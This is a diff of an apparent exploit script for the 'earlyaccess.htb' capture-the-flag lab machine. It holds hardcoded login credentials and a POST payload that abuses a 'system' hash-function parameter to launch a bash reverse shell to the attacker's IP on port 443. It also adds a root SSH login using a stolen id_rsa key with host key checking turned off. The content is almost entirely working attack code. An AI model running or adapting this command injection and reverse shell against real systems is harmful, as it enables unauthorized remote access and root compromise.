@@ -21,7 +21,7 @@ password = "pr1ngl3s123"
 password2 = "pr1ngl3s123"
 url_login = "https://earlyaccess.htb/login"
 url_key = "https://earlyaccess.htb/key"
-
+MyIP="10.10.14.13"
 
 s = requests.session()
 
@@ -250,7 +250,7 @@ def Send_Shell():
 	data_post = {
 		'action': 'hash',
 		'redirect': 'true',
-		'password': "bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'",
+		'password': f"bash -c 'bash -i >& /dev/tcp/{MyIP}/443 0>&1'",
 		'hash_function': 'system',
 		'debug': 'test'
 	}
@@ -345,7 +345,7 @@ def GetID_RSA(username,password, username_adm, password_adm):
 
 
 def GetRoot_Shell():
-	ssh_command = "ssh -i id_rsa root@10.10.11.110"
+	ssh_command = "ssh -i id_rsa root@10.10.11.110 -o StrictHostKeyChecking=no"
 
 	ssh_session = pexpect.spawn(ssh_command, timeout=None)
 
